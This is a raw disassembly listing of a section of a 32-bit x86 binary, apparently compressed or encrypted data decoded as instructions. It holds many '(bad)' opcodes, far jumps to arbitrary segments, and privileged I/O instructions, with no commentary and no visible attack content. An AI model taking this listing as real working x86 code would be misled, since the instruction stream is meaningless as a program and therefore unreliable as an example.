  406857:	or     ebx,eax
  406859:	xchg   ebx,eax
  40685a:	test   BYTE PTR [esi+0x73],dh
  40685d:	add    DWORD PTR [ebx],ebx
  40685f:	xabort 0x60
  406862:	sbb    cl,bh
  406864:	out    dx,eax
  406865:	fwait
  406866:	dec    ebx
  406867:	jg     0x4067eb
  406869:	xor    ebp,esi
  40686b:	das    
  40686c:	add    BYTE PTR [edx],al
  40686e:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406870:	cmp    esp,DWORD PTR [edi+0x52c53bef]
  406876:	icebp  
  406877:	jnp    0x4068db
  406879:	sub    al,0xd3
  40687b:	jae    0x406805
  40687d:	push   ebx
  40687e:	into   
  40687f:	mov    ch,0xd9
  406881:	dec    eax
  406882:	cli    
  406883:	call   0x9b02:0x942f1b23
  40688a:	daa    
  40688b:	jne    0x4068bf
  40688d:	push   cs
  40688e:	sub    DWORD PTR [edi-0x2e],0xffffffa9
  406892:	adc    BYTE PTR [edi+0x3b],al
  406895:	mov    ch,0x5b
  406897:	push   ds
  406898:	and    ebp,DWORD PTR gs:[ebp+0x4]
  40689c:	nop
  40689d:	nop
  40689e:	rcl    BYTE PTR [ebp-0x5e71cab6],0x14
  4068a5:	push   esp
  4068a6:	push   edx
  4068a7:	cdq    
  4068a8:	cmp    al,0xb6
  4068aa:	fisttp QWORD PTR [edi+0x487c83a5]
  4068b0:	pusha  
  4068b1:	and    edx,DWORD PTR [eax-0x6d]
  4068b4:	xor    al,0x30
  4068b6:	out    dx,al
  4068b7:	and    eax,0x232269b9
  4068bc:	pop    ds
  4068bd:	mov    ebx,0x5768efe2
  4068c2:	hlt    
  4068c3:	xor    DWORD PTR [edx+ebx*8+0x4cd571dd],esp
  4068ca:	sar    DWORD PTR [edx+0xb],0xd4
  4068ce:	and    DWORD PTR [ecx],0xffffff99
  4068d1:	pop    edi
  4068d2:	dec    edi
  4068d3:	out    dx,al
  4068d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068d5:	cmp    al,0xcd
  4068d7:	xchg   ch,cl
  4068d9:	cdq    
  4068da:	push   cs
  4068db:	xlat   BYTE PTR ds:[ebx]
  4068dc:	and    al,BYTE PTR [edx-0x2f3e1da8]
  4068e2:	cli    
  4068e3:	(bad)  
  4068e4:	das    
  4068e5:	call   0x67f1:0x61326961
  4068ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068ed:	xchg   esi,eax
  4068ee:	in     eax,dx
  4068ef:	lods   al,BYTE PTR ds:[esi]
  4068f0:	push   ecx
  4068f1:	stos   BYTE PTR es:[edi],al
  4068f2:	jmp    0x3dd8b46
  4068f7:	call   0xa8d17d2d
  4068fc:	aam    0xe
  4068fe:	sub    edi,edi
  406900:	xchg   DWORD PTR [esi+0x53d74e29],ebp
  406906:	dec    eax
  406907:	out    0xc1,eax
  406909:	adc    DWORD PTR [eax+0x62],esp
  40690c:	sub    al,0xe1
  40690e:	jmp    0x4068e8
  406910:	ja     0x40689c
  406912:	and    ebp,DWORD PTR [ebx+0x1a]
  406915:	std    
  406916:	jmp    0x2fd7:0xee24fc23
  40691d:	adc    ebx,DWORD PTR [edi]
  40691f:	mov    WORD PTR [edx-0x7b],?
  406922:	adc    BYTE PTR [ecx],bh
  406924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406925:	mov    bl,0xd2
  406927:	je     0x40694e
  406929:	out    dx,eax
  40692a:	rol    BYTE PTR [esi],0xf4
  40692d:	xchg   BYTE PTR [edi-0x4],bh
  406930:	dec    edi
  406931:	push   esp
  406932:	dec    ebp
  406933:	pop    eax
  406934:	retf   0x8cb
  406937:	add    DWORD PTR gs:[esp+ecx*1-0x5adf57d9],eax
  40693f:	ret    
  406940:	inc    edi
  406941:	mov    WORD PTR [eax+0x2e],cs
  406944:	pop    esi
  406945:	jnp    0x4069bd
  406947:	xchg   esp,eax
  406948:	jmp    0xb0407576
  40694d:	pop    ecx
  40694e:	jno    0x406929
  406950:	jnp    0x4068d3
  406952:	push   edi
  406953:	cmp    al,0x2c
  406955:	loop   0x406968
  406957:	push   eax
  406958:	pop    ecx
  406959:	mov    ecx,0x47d5b0bd
  40695e:	mov    eax,ds:0x9ea8b4a5
  406963:	div    DWORD PTR [esi+0x3c]
  406966:	aad    0x4a
  406968:	scas   eax,DWORD PTR es:[edi]
  406969:	mov    ds,WORD PTR [ecx]
  40696b:	clc    
  40696c:	cmp    BYTE PTR [ecx+eax*2+0xb1519ad],0x1e
  406974:	pop    edi
  406975:	dec    edi
  406976:	dec    ecx
  406977:	fdivr  DWORD PTR [edx]
  406979:	mov    bh,0xde
  40697b:	in     al,0x84
  40697d:	imul   edx,DWORD PTR [esi+0x44a8ec96],0x35
  406984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406985:	sbb    DWORD PTR [edi],0x6486ff93
  40698b:	mov    ds:0x46aed487,al
  406990:	ins    BYTE PTR es:[edi],dx
  406991:	and    dh,bh
  406993:	mov    esp,0x647bb3ec
  406998:	fmul   DWORD PTR [ecx+0x6c]
  40699b:	add    al,0xca
  40699d:	pop    edx
  40699e:	cmp    DWORD PTR [eax-0x726900a4],edx
  4069a4:	xchg   esi,eax
  4069a5:	in     al,dx
  4069a6:	pop    eax
  4069a7:	data16 aas 
  4069a9:	inc    esi
  4069aa:	nop
  4069ab:	push   ss
  4069ac:	aaa    
  4069ad:	jle    0x4069d2
  4069af:	xor    BYTE PTR [edx+edi*1-0x6f9a0a6a],0x66
  4069b7:	push   edi
  4069b8:	mov    eax,ecx
  4069ba:	xor    al,0xf4
  4069bc:	cmp    al,0x3e
  4069be:	cld    
  4069bf:	mov    ah,0x8d
  4069c1:	fstp   st(1)
  4069c3:	dec    eax
  4069c4:	test   al,0xf2
  4069c6:	je     0x4069cb
  4069c8:	or     eax,0x1725a170
  4069cd:	adc    dh,ch
  4069cf:	mov    ebp,0x6fbb230f
  4069d4:	mov    DWORD PTR [eax+0x71],esi
  4069d7:	rol    eax,1
  4069d9:	pop    ebp
  4069da:	retf   
  4069db:	les    ebp,FWORD PTR [ebx]
  4069dd:	push   edi
  4069de:	ds dec ebx
  4069e0:	pop    ds
  4069e1:	push   0x969fbf18
  4069e6:	mov    DWORD PTR [ebp+0x1f],edx
  4069e9:	iret   
  4069ea:	inc    esi
  4069eb:	inc    ebp
  4069ec:	dec    esp
  4069ed:	add    edi,esp
  4069ef:	or     cl,bl
  4069f1:	mov    dl,0x2c
  4069f3:	push   0xffffffa8
  4069f5:	retf   
  4069f6:	pop    ebp
  4069f7:	jmp    0x40698a
  4069f9:	(bad)
  4069fd:	ins    BYTE PTR es:[edi],dx
  4069fe:	pop    ebp
  4069ff:	inc    esp
  406a00:	xchg   bh,al
  406a02:	stc    
  406a03:	and    bl,BYTE PTR [edi+0x3e]
  406a06:	push   esi
  406a07:	iret   
  406a08:	inc    dh
  406a0a:	add    cl,ch
  406a0c:	jge    0x4069d2
  406a0e:	fisub  WORD PTR [edi]
  406a10:	add    eax,0xb3a7741e
  406a15:	out    0x9b,eax
  406a17:	and    BYTE PTR [ebp+0x70],ch
  406a1a:	lods   eax,DWORD PTR ds:[esi]
  406a1b:	dec    ecx
  406a1c:	fadd   DWORD PTR es:[edi+0x47]
  406a20:	push   edi
  406a21:	aaa    
  406a22:	cmp    esp,DWORD PTR [ecx]
  406a24:	pop    ecx
  406a25:	ret    
  406a26:	js     0x4069f1
  406a28:	dec    esi
  406a29:	into   
  406a2a:	arpl   WORD PTR [ebp-0xeb25181],sp
  406a30:	sar    BYTE PTR [ecx],0x8
  406a33:	and    al,0x98
  406a35:	lods   eax,DWORD PTR gs:[esi]
  406a37:	cld    
  406a38:	jnp    0x406a56
  406a3a:	int    0x5d
  406a3c:	aam    0xbb
  406a3e:	add    DWORD PTR [edx],esi
  406a40:	cmc    
  406a41:	shr    DWORD PTR [ecx],0xf2
  406a44:	das    
  406a45:	pop    eax
  406a46:	mov    al,ds:0xc275c82f
  406a4b:	mov    ebx,0x67a0e8b8
  406a50:	fcmove st,st(7)
  406a52:	jg     0x406aa8
  406a54:	jmp    0xa39d:0x76bcc866
  406a5b:	add    eax,0xb20eeacd
  406a60:	int    0x69
  406a62:	adc    BYTE PTR [esi+eiz*8+0x20],bh
  406a66:	jne    0x406ac0
  406a68:	call   0x6a2c:0x3ec6d99b
  406a6f:	jecxz  0x406ac2
  406a71:	loope  0x406a30
  406a73:	adc    al,0xa9
  406a75:	cmp    al,0xab
  406a77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a78:	and    BYTE PTR ss:[edx+ebx*2],bl
  406a7c:	and    al,0x79
  406a7e:	addr16 mov al,al
  406a81:	je     0x406a75
  406a83:	and    BYTE PTR [ebx+0x3e],0xc0
  406a87:	lods   al,BYTE PTR ds:[esi]
  406a88:	iret   
  406a89:	adc    eax,0xb527f728
  406a8e:	and    DWORD PTR [edi-0x7c],0xffffff94
  406a92:	repnz fmul QWORD PTR [ebp-0x243431c6]
  406a99:	stc    
  406a9a:	data16 jne 0x406b0b
  406a9d:	js     0x406ae6
  406a9f:	mov    BYTE PTR [ecx+0x28],ah
  406aa2:	arpl   WORD PTR [edx+0x557b5471],bp
  406aa8:	jl     0x406ade
  406aaa:	push   eax
  406aab:	xor    eax,0x8eeefda8
  406ab0:	sub    DWORD PTR [edi-0xb0facca],0xe07b0d2d
  406aba:	mov    BYTE PTR [ecx],al
  406abc:	out    dx,eax
  406abd:	cwde   
  406abe:	mov    BYTE PTR [ebp+0x23],ch
  406ac1:	dec    esp
  406ac2:	fisubr DWORD PTR [edi]
  406ac4:	pop    ebp
  406ac5:	add    BYTE PTR [ebx+0x70957957],cl
  406acb:	in     al,dx
  406acc:	adc    BYTE PTR [eax-0x278956c5],dh
  406ad2:	icebp  
  406ad3:	scas   eax,DWORD PTR es:[edi]
  406ad4:	mov    dl,0xca
  406ad6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ad7:	mov    ds:0x467dfc01,al
  406adc:	leave  
  406add:	mov    ebp,0xa8ff2f38
  406ae2:	jp     0x406b38
  406ae4:	sub    ebx,edi
  406ae6:	cld    
  406ae7:	mov    DWORD PTR [edx+edx*1+0xcc2102b],esi
  406aee:	shl    DWORD PTR [ebx-0x4412fd60],cl
  406af4:	push   ecx
  406af5:	mov    ch,0xc
  406af7:	fsubr  QWORD PTR [edi]
  406af9:	sar    DWORD PTR ds:0x9ffa3b0b,cl
  406aff:	imul   esi,DWORD PTR [esi+edx*1+0x20],0x4f
  406b04:	(bad)  
  406b05:	popa   
  406b06:	sub    dl,BYTE PTR [esp+eiz*8+0x4d]
  406b0a:	scas   al,BYTE PTR es:[edi]
  406b0b:	push   edi
  406b0c:	(bad)  
  406b0e:	int3   
  406b0f:	xor    BYTE PTR [ebx+0x40],bl
  406b12:	inc    eax
  406b13:	adc    edi,DWORD PTR [edx-0x5d]
  406b16:	fisub  DWORD PTR [esp+edi*2+0x66]
  406b1a:	push   ebx
  406b1b:	mov    ebp,esp
  406b1d:	cli    
  406b1e:	add    al,0x49
  406b20:	dec    ebx
  406b21:	nop
  406b22:	fisubr WORD PTR [ebp+eax*4+0x3c865c07]
  406b29:	icebp  
  406b2a:	call   0xe005ba39
  406b2f:	dec    esp
  406b30:	hlt    
  406b31:	or     DWORD PTR [edi],ebx
  406b33:	scas   eax,DWORD PTR es:[edi]
  406b34:	xchg   esp,eax
  406b35:	mov    edi,0xb0e0b8a9
  406b3a:	out    dx,al
  406b3b:	aaa    
  406b3c:	dec    ebp
  406b3d:	ins    DWORD PTR es:[edi],dx
  406b3e:	daa    
  406b3f:	arpl   sp,sp
  406b41:	jo     0x406b5e
  406b43:	in     eax,0x3a
  406b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b46:	jo     0x406ad9
  406b48:	adc    dl,dl
  406b4a:	fld    st(6)
  406b4c:	inc    ebp
  406b4d:	add    al,0x5d
  406b4f:	jo     0x406b7c
  406b51:	and    DWORD PTR [esi],edi
  406b53:	sub    al,0x2
  406b55:	frstor [eax]
  406b57:	xchg   DWORD PTR [ebx],eax
  406b59:	push   cs
  406b5a:	call   0x5274:0x20a45ac0
  406b61:	sub    bl,BYTE PTR [esi+ecx*1-0x1ceedd4c]
  406b68:	mov    ecx,0xe0ffb0a1
  406b6d:	pop    es
  406b6e:	pop    edi
  406b6f:	jae    0x406b0c
  406b71:	jnp    0x406afb
  406b73:	sahf   
  406b74:	sub    BYTE PTR cs:[esi+ecx*4],al
  406b78:	or     al,0xd5
  406b7a:	jae    0x406afe
  406b7c:	imul   ecx,DWORD PTR [esi-0x316ac305],0x7cb110fc
  406b86:	sub    DWORD PTR [edi-0x1f],esp
  406b89:	mov    ch,bl
  406b8b:	cwde   
  406b8c:	bound  ecx,QWORD PTR [edi+0x67]
  406b8f:	retf   
  406b90:	fldpi  
  406b92:	ja     0x406bab
  406b94:	test   bl,bh
  406b96:	and    edi,DWORD PTR [ebx+0x52813f31]
  406b9c:	(bad)  
  406b9d:	(bad)  
  406b9e:	lock dec eax
  406ba0:	rol    BYTE PTR [edi+eax*1],1
  406ba3:	imul   edx,DWORD PTR [ebx-0x23],0x14abe897
  406baa:	test   eax,0x7d880f52
  406baf:	stos   DWORD PTR es:[edi],eax
  406bb0:	jnp    0x406c1c
  406bb2:	jo     0x406bc5
  406bb4:	or     bl,cl
  406bb6:	adc    WORD PTR ds:[edx+0x401cf92b],ax
  406bbe:	xchg   ebx,eax
  406bbf:	pop    edx
  406bc0:	int3   
  406bc1:	push   esi
  406bc2:	pop    edx
  406bc3:	(bad)  
  406bc5:	jnp    0x406b87
  406bc7:	dec    ecx
  406bc8:	in     al,dx
  406bc9:	inc    esi
  406bca:	ins    DWORD PTR es:[edi],dx
  406bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bcc:	mov    edi,DWORD PTR [ebx-0x34f872bd]
  406bd2:	je     0x406b5d
  406bd4:	(bad)  
  406bd5:	call   DWORD PTR [ecx]
  406bd7:	push   edx
  406bd8:	hlt    
  406bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bda:	mov    dl,0xda
  406bdc:	mov    esp,0x75f8a33a
  406be1:	je     0x406b6a
  406be3:	lods   eax,DWORD PTR ds:[esi]
  406be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406be5:	int3   
  406be6:	retf   
  406be7:	mov    dl,0x46
  406be9:	xlat   BYTE PTR ds:[ebx]
  406bea:	out    dx,al
  406beb:	mov    eax,0xde24cbbe
  406bf0:	inc    edx
  406bf1:	adc    dl,BYTE PTR [ebp+0x43aa5666]
  406bf7:	leave  
  406bf8:	pop    ds
  406bf9:	mov    cl,0x1d
  406bfb:	jno    0x406baf
  406bfd:	fmulp  st(3),st
  406bff:	retf   
  406c00:	push   0xffffffd7
  406c02:	xchg   ecx,eax
  406c03:	and    al,0xb1
  406c05:	icebp  
  406c06:	outs   dx,DWORD PTR ds:[esi]
  406c07:	sbb    dl,BYTE PTR [ecx+0x21]
  406c0a:	mov    ecx,?
  406c0c:	push   ecx
  406c0d:	shl    edi,0x57
  406c10:	(bad)  
  406c11:	push   ebx
  406c12:	jge    0x406c5b
  406c14:	xchg   ecx,eax
  406c15:	out    0xbc,eax
  406c17:	dec    esi
  406c18:	bound  edi,QWORD PTR [ebx-0xe]
  406c1b:	mov    eax,ds:0xd9e188f0
  406c20:	and    BYTE PTR [eax-0x79f3761c],0xa0
  406c27:	dec    edi
  406c28:	mov    bl,0x43
  406c2a:	adc    BYTE PTR [eax],al
  406c2c:	in     al,dx
  406c2d:	scas   al,BYTE PTR es:[edi]
  406c2e:	fadd   st(2),st
  406c30:	push   cs
  406c31:	mov    eax,ds:0xc55b1056
  406c36:	rcl    DWORD PTR [edi+0x2d311cb6],cl
  406c3c:	pop    esp
  406c3d:	mov    ebx,0x847a9ad1
  406c42:	pushf  
  406c43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c44:	out    0x67,al
  406c46:	cdq    
  406c47:	shr    DWORD PTR [ebp-0xa673e7c],0xe7
  406c4e:	xor    ch,BYTE PTR [esi+edi*8+0x31]
  406c52:	retf   
  406c53:	sub    BYTE PTR [ecx+0x48],ah
  406c56:	jno    0x406c82
  406c58:	pop    eax
  406c59:	test   BYTE PTR ds:0x993d3cb3,ah
  406c5f:	or     DWORD PTR [edi+0x34],ecx
  406c62:	sbb    ecx,esi
  406c64:	cwde   
  406c65:	sub    esp,edi
  406c67:	shr    BYTE PTR [ecx-0x8],cl
  406c6a:	cdq    
  406c6b:	mov    ds:0x7790bdc2,al
  406c70:	jg     0x406cbe
  406c72:	dec    ebp
  406c73:	dec    ecx
  406c74:	popa   
  406c75:	mov    ch,0x8
  406c77:	add    cl,bl
  406c79:	les    bp,DWORD PTR ds:0xbe404e49
  406c80:	sbb    BYTE PTR [edx+0x370a79e2],0x41
  406c87:	in     eax,0x44
  406c89:	dec    eax
  406c8a:	in     al,0x66
  406c8c:	xchg   ebx,eax
  406c8d:	adc    ax,0x744a
  406c91:	adc    BYTE PTR es:[ecx-0x470ba891],dl
  406c98:	jp     0x406cb9
  406c9a:	cmc    
  406c9b:	dec    esp
  406c9c:	mov    ebx,0xdad60500
  406ca1:	sub    bh,ch
  406ca3:	in     al,dx
  406ca4:	dec    edi
  406ca5:	dec    esp
  406ca6:	pop    edx
  406ca7:	cs hlt 
  406ca9:	mov    ecx,0xf7c4cba
  406cae:	mov    cl,0xc8
  406cb0:	pop    eax
  406cb1:	xor    al,0x49
  406cb3:	popa   
  406cb4:	cmp    eax,0x69b3ac18
  406cb9:	imul   esi,DWORD PTR [edx+ebx*8-0x45],0x17
  406cbe:	or     BYTE PTR [esi+0x6c0ef992],ch
  406cc4:	out    dx,al
  406cc5:	test   eax,0xd6e71f56
  406cca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ccb:	shl    eax,cl
  406ccd:	ret    0xba60
  406cd0:	ds out 0x46,al
  406cd3:	add    al,0x66
  406cd5:	mov    cl,0x77
  406cd7:	add    eax,eax
  406cd9:	or     al,0xe2
  406cdb:	push   0x846aa079
  406ce0:	int3   
  406ce1:	jmp    0x406d29
  406ce3:	(bad)  
  406ce4:	push   0xffffffe5
  406ce6:	fs jno 0x406d34
  406ce9:	lods   al,BYTE PTR ds:[esi]
  406cea:	bound  esi,QWORD PTR [ecx+0x4036d73d]
  406cf0:	in     eax,dx
  406cf1:	je     0x406d02
  406cf3:	int3   
  406cf4:	mov    dh,0x6d
  406cf6:	ret    0xfc51
  406cf9:	mov    ds:0x408d4204,al
  406cfe:	inc    eax
  406cff:	gs leave 
  406d01:	in     eax,dx
  406d02:	fdivr  st(3),st
  406d04:	fidivr WORD PTR [esi]
  406d06:	mov    dh,0x34
  406d08:	sbb    esp,DWORD PTR [esi-0x10b2aac4]
  406d0e:	fwait
  406d0f:	sub    DWORD PTR [ebx-0x31],esp
  406d12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d13:	jns    0x406cda
  406d15:	xor    al,0xef
  406d17:	add    BYTE PTR [esi],0xcd
  406d1a:	xchg   ecx,eax
  406d1b:	mov    eax,DWORD PTR [edi]
  406d1d:	xchg   DWORD PTR [ebx-0x13],edx
  406d20:	scas   al,BYTE PTR es:[edi]
  406d21:	jg     0x406d09
  406d23:	fld    DWORD PTR [esi+0x4d]
  406d26:	or     eax,0xe03d525a
  406d2b:	mov    eax,ds:0xa1b3a897
  406d30:	adc    edi,ebp
  406d32:	call   0x2dc47681
  406d37:	out    0xde,al
  406d39:	and    BYTE PTR [esp+ecx*4+0x5cc0cc66],ah
  406d40:	jo     0x406d10
  406d42:	jg     0x406ce2
  406d44:	push   esp
  406d45:	gs ins BYTE PTR es:[edi],dx
  406d47:	and    al,0xfe
  406d49:	mov    al,0xa0
  406d4b:	push   ebp
  406d4c:	imul   esi,esi,0xffffff9e
  406d4f:	dec    DWORD PTR [eax+0x23]
  406d52:	in     al,0x90
  406d54:	xchg   ebx,eax
  406d55:	aas    
  406d56:	sub    eax,0x9f7a5898
  406d5b:	sbb    dh,BYTE PTR [ecx+0x76]
  406d5e:	pop    esp
  406d5f:	(bad)  
  406d60:	adc    eax,0x738eeec5
  406d65:	imul   ebp,DWORD PTR [esi+0x58],0x61db7ed0
  406d6c:	cmp    dl,BYTE PTR [edi-0x469af8d4]
  406d72:	push   ss
  406d73:	je     0x406d36
  406d75:	jb     0x406dc5
  406d77:	mov    DWORD PTR [esi+eiz*4],ecx
  406d7a:	cmp    al,0xfd
  406d7c:	mov    WORD PTR [esi-0x44],?
  406d7f:	aaa    
  406d80:	(bad)  
  406d81:	or     BYTE PTR [eax+ecx*4],bl
  406d84:	fs loop 0x406dd7
  406d87:	xchg   ecx,eax
  406d88:	jle    0x406d42
  406d8a:	fst    DWORD PTR [esi+0x4]
  406d8d:	outs   dx,DWORD PTR ds:[esi]
  406d8e:	test   DWORD PTR [esi+ecx*8],esi
  406d91:	inc    esp
  406d92:	jmp    0x7494:0x91aa4d8b
  406d99:	cmp    ebp,esi
  406d9b:	inc    esi
  406d9c:	and    edi,edi
  406d9e:	and    dh,BYTE PTR [ebx]
  406da0:	or     eax,0xc741459e
  406da5:	or     DWORD PTR [ebx+0x41],0x39ce4a00
  406dac:	mov    dh,0xe7
  406dae:	push   esp
  406daf:	pop    ebp
  406db0:	mov    esp,0x6d0796d3
  406db5:	pop    edi
  406db6:	popa   
  406db7:	jns    0x406de0
  406db9:	cld    
  406dba:	mov    DWORD PTR [edi+0x2408b203],esp
  406dc0:	push   ebp
  406dc1:	inc    esi
  406dc2:	jno    0x406d8c
  406dc4:	xor    cl,BYTE PTR [edi+eax*2]
  406dc7:	dec    esp
  406dc8:	add    al,0x4e
  406dca:	push   esi
  406dcb:	sahf   
  406dcc:	addr16 cmc 
  406dce:	popa   
  406dcf:	jne    0x406d86
  406dd1:	dec    esp
  406dd2:	scas   eax,DWORD PTR es:[edi]
  406dd3:	aas    
  406dd4:	xchg   edx,eax
  406dd5:	cmp    eax,0xe4e18b2e
  406dda:	push   cs
  406ddb:	jb     0x406d88
  406ddd:	test   bl,ah
  406ddf:	jmp    0xbe76:0x12df23d
  406de6:	cld    
  406de7:	sti    
  406de8:	sar    edx,0x9c
  406deb:	int    0xbb
  406ded:	cmp    eax,0x1fe445a6
  406df2:	dec    DWORD PTR [esi+0x54]
  406df5:	cmp    bh,dh
  406df7:	mov    ah,0xd2
  406df9:	sub    eax,0x6ad103c7
  406dfe:	pop    ecx
  406dff:	cdq    
  406e00:	sbb    ecx,DWORD PTR [eax+edx*2]
  406e03:	add    dl,BYTE PTR [edx-0x2966420a]
  406e09:	ficomp WORD PTR [ebx]
  406e0b:	enter  0x222,0x3f
  406e0f:	inc    esp
  406e10:	pfrcpit2 mm0,QWORD PTR [esi+ebp*8-0x2f092e1c]
  406e19:	dec    edi
  406e1a:	dec    edi
  406e1b:	add    eax,0x1461de62
  406e20:	dec    esi
  406e21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e22:	mov    esi,0xca5151da
  406e27:	nop
  406e28:	adc    al,0x6
  406e2a:	add    eax,0x78a11270
  406e2f:	jbe    0x406df4
  406e31:	xor    eax,0xfdea5178
  406e36:	icebp  
  406e37:	jns    0x406eaf
  406e39:	xlat   BYTE PTR ds:[ebx]
  406e3a:	mov    ds:0xfb8d8aba,eax
  406e3f:	dec    ebx
  406e40:	xchg   ebx,eax
  406e41:	cli    
  406e42:	aam    0x63
  406e44:	mov    ds:0xceee4e63,al
  406e49:	mov    ecx,0x4519cbfc
  406e4e:	xor    al,0x45
  406e50:	jmp    0x4676:0xee2f6a64
  406e57:	ret    
  406e58:	(bad)  
  406e59:	mov    edi,0x7d57f51f
  406e5e:	jmp    0x5d973f2f
  406e63:	jno    0x406eb9
  406e65:	mov    ?,ebp
  406e67:	pop    DWORD PTR ds:0x1aedf4a1
  406e6d:	cmp    edi,eax
  406e6f:	aam    0x3b
  406e71:	sbb    eax,0xcca2ede3
  406e76:	outs   dx,BYTE PTR ds:[esi]
  406e77:	cld    
  406e78:	sub    eax,0xd17468a9
  406e7d:	sbb    ebx,DWORD PTR [eax+0x40ea3b7a]
  406e83:	cmp    eax,0x39a27d5f
  406e88:	jne    0x406ee2
  406e8a:	mov    DWORD PTR [di+0x536],ebp
  406e8f:	push   ds
  406e90:	mov    ch,ch
  406e92:	jmp    0x1b2b:0x4cee05c8
  406e99:	cmp    BYTE PTR [edi],al
  406e9b:	(bad)  
  406e9c:	hlt    
  406e9d:	aam    0x1f
  406e9f:	in     eax,0x41
  406ea1:	pop    edi
  406ea2:	adc    eax,ebp
  406ea4:	mov    ch,0xda
  406ea6:	xchg   esi,eax
  406ea7:	hlt    
  406ea8:	mov    BYTE PTR [edx-0x53],cl
  406eab:	in     al,0x23
  406ead:	ds dec edx
  406eaf:	jns    0x406e8b
  406eb1:	mov    cl,0x52
  406eb3:	sub    DWORD PTR [ebx],0xe3b5d07b
  406eb9:	sub    ecx,DWORD PTR [ebx+0x1b1e2db3]
  406ebf:	mov    edx,0x7b636d1f
  406ec4:	xor    dh,BYTE PTR [esi]
  406ec6:	das    
  406ec7:	push   ds
  406ec8:	cmp    BYTE PTR [esi+0x23a4b34e],cl
  406ece:	bound  ebp,QWORD PTR [eax+eiz*4+0x6c]
  406ed2:	push   ds
  406ed3:	scas   eax,DWORD PTR es:[edi]
  406ed4:	lock or BYTE PTR ds:0xd5d03067,bl
  406edb:	hlt    
  406edc:	pop    es
  406edd:	(bad)  
  406ede:	and    bl,BYTE PTR [ecx-0x30a3b51d]
  406ee4:	imul   eax,ebp,0xf73a9079
  406eea:	xchg   BYTE PTR [edx],al
  406eec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406eed:	call   DWORD PTR [ebx]
  406eef:	stos   BYTE PTR es:[edi],al
  406ef0:	add    cl,al
  406ef2:	out    0xac,eax
  406ef4:	push   0x61cc4f73
  406ef9:	jle    0x406f63
  406efb:	inc    ebp
  406efc:	ret    0x1456
  406eff:	pop    es
  406f00:	cdq    
  406f01:	stos   BYTE PTR es:[edi],al
  406f02:	ins    DWORD PTR es:[edi],dx
  406f03:	mov    es,esi
  406f05:	and    dl,BYTE PTR [edx+0x22]
  406f08:	sbb    bh,BYTE PTR [ecx-0x49d2833d]
  406f0e:	add    DWORD PTR [edi+0xc5934b2],esi
  406f14:	or     eax,0x63a1bb03
  406f19:	xchg   esi,eax
  406f1b:	pushf  
  406f1c:	ffree  st(3)
  406f1e:	xchg   ecx,eax
  406f1f:	xchg   esi,eax
  406f20:	xchg   ebx,eax
  406f21:	outs   dx,DWORD PTR ds:[esi]
  406f22:	sbb    DWORD PTR [ebp+eiz*2-0x5251854f],esp
  406f29:	pop    esi
  406f2a:	test   BYTE PTR [esi+ecx*2+0x28d7a9bb],bl
  406f31:	mov    esp,0x66029995
  406f36:	jecxz  0x406edf
  406f38:	mov    edx,0x9be33675
  406f3d:	in     al,dx
  406f3e:	add    BYTE PTR [esi+0xe],0x9d
  406f42:	sub    al,0x5f
  406f44:	scas   al,BYTE PTR es:[edi]
  406f45:	push   cs
  406f46:	xor    al,0x99
  406f49:	and    al,0x87
  406f4b:	mov    al,0x14
  406f4d:	mov    ds:0x21194e03,eax
  406f52:	mov    BYTE PTR [esi],bl
  406f54:	push   esp
  406f55:	jge    0x406fcc
  406f57:	jo     0x406ef2
  406f59:	push   ebp
  406f5a:	das    
  406f5b:	imul   ecx,DWORD PTR [eax+esi*8-0x498fd75d],0xeefd3dea
  406f66:	adc    esi,ebp
  406f68:	in     eax,dx
  406f69:	in     eax,dx
  406f6a:	iret   
  406f6b:	sbb    BYTE PTR ds:0x74dd933c,cl
  406f71:	sar    ecx,1
  406f73:	mov    ?,edi
  406f75:	sbb    ebx,DWORD PTR [ecx+esi*2]
  406f78:	cmp    bh,BYTE PTR [ebx-0x3b]
  406f7b:	jns    0x406ff5
  406f7d:	xchg   BYTE PTR [edi-0x3bed6d48],bh
  406f83:	pop    ds
  406f84:	mov    ds:0x69f0a3b8,eax
  406f89:	inc    edx
  406f8a:	xor    edi,DWORD PTR [ecx+0x746b6b3a]
  406f90:	dec    edx
  406f91:	rcr    DWORD PTR [edx-0x61f5540b],1
  406f97:	scas   eax,DWORD PTR es:[edi]
  406f98:	pop    ss
  406f99:	dec    eax
  406f9a:	xchg   edx,eax
  406f9b:	and    DWORD PTR [ebp-0x5f87bf3e],edx
  406fa1:	pop    ebp
  406fa2:	push   ss
  406fa3:	sahf   
  406fa4:	leave  
  406fa5:	mov    edi,0x1910d3ef
  406faa:	sub    ch,BYTE PTR [esi+0x34]
  406fad:	inc    ecx
  406fae:	outs   dx,BYTE PTR ds:[esi]
  406faf:	(bad)  [ebp+0x439689f6]
  406fb5:	sub    ch,0xd8
  406fb8:	ret    
  406fb9:	dec    edx
  406fba:	neg    DWORD PTR [ecx]
  406fbc:	int3   
  406fbd:	std    
  406fbe:	xor    al,0x8c
  406fc0:	clc    
  406fc1:	fild   DWORD PTR [ecx-0x12]
  406fc4:	fs out 0x38,eax
  406fc7:	cld    
  406fc8:	sub    al,ah
  406fca:	std    
  406fcb:	ror    BYTE PTR [edx+ecx*2+0x4f9cdcfa],1
  406fd2:	and    al,0xa2
  406fd4:	ins    BYTE PTR es:[edi],dx
  406fd5:	add    DWORD PTR [edx+ebp*2-0x6a4aace7],esi
  406fdc:	das    
  406fdd:	enter  0x69d9,0x27
  406fe1:	lahf   
  406fe2:	jecxz  0x406f96
  406fe4:	add    ah,al
  406fe6:	ds stos BYTE PTR es:[edi],al
  406fe8:	int3   
